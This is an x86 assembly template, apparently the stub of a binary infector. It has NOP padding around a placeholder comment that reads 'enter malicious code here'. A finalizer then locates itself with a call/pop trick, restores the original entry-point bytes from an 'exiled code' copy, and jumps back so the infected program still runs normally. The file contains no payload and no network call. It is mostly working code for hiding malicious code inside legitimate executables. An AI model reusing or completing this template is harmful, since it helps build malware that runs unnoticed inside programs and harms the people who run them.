global _start
  
section .text

_start:
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
; -------------------------------------------
; enter malicious code here
; -------------------------------------------

; <OFFSET_FROM_ENTRY_POINT>    - offset from entry point to finalizer
; <OFFSET_FROM_CODE_BEGINNING> - offset from entry point to code beginning
; <OFFSET_TO_EXILED_CODE>      - offset from entry point to exiled code
; <EXILED_CODE_SIZE>           - size of exiled code

    call    get_current_addr                    ; push return address

get_current_addr:
    pop     eax                                 ; pop current address
    sub     eax, 0x5                            ; eax = address of finalizer, 0x5 = size of call instruction
    sub     eax, <OFFSET_FROM_ENTRY_POINT>      ; eax = address of entry point
    mov     ebx, eax                            ; ebx = address of entry point
    sub     ebx, <OFFSET_FROM_CODE_BEGINNING>   ; ebx = address of first byte of code (doesn't have to be code section address)
    mov     edi, eax                            ; edi = address of entry point
    add     edi, <OFFSET_TO_EXILED_CODE>        ; edi = address of exiled code
    
    mov     ecx, <EXILED_CODE_SIZE>             ; exiled code size
    xor     edx, edx                            ; edx = 0
    
copy_loop:
    mov     dl, [edi]                           ; memory-memory copy, phase 1
    mov     [ebx], dl                           ; memory-memory copy, phase 2
    inc     edi                                 ; increment addresses
    inc     ebx                                 ;
    loop copy_loop

    jmp     eax                                 ; jump back to entry point

; -------------------------------------------
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop